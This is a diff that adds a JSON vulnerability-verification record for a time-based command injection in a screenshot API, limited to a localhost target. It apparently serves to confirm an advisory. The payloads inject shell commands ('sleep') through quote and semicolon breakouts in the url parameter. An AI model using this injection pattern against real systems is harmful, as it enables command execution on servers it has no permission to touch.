@@ -1,0 +1,35 @@
+{
+  "finding_id": "GHSA-5qg5-g7c2-pfx8",
+  "type": "command_injection.time_based",
+  "target": {
+    "expected_origin": "http://127.0.0.1:3009",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [3009]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "base_request": {
+      "method": "GET",
+      "url": "http://127.0.0.1:3009/api/screenshot?url=http://127.0.0.1/"
+    },
+    "injection": {
+      "location": {
+        "kind": "query",
+        "name": "url"
+      },
+      "payloads": {
+        "control": "http://127.0.0.1/",
+        "delay_low": "http://127.0.0.1/?x=\";sleep 0;\"",
+        "delay_high": "http://127.0.0.1/?x=\";sleep 5;\""
+      }
+    }
+  },
+  "proof": {
+    "repetitions": 4,
+    "min_median_delta_ms": 3500,
+    "require_body_similarity": true
+  }
+}
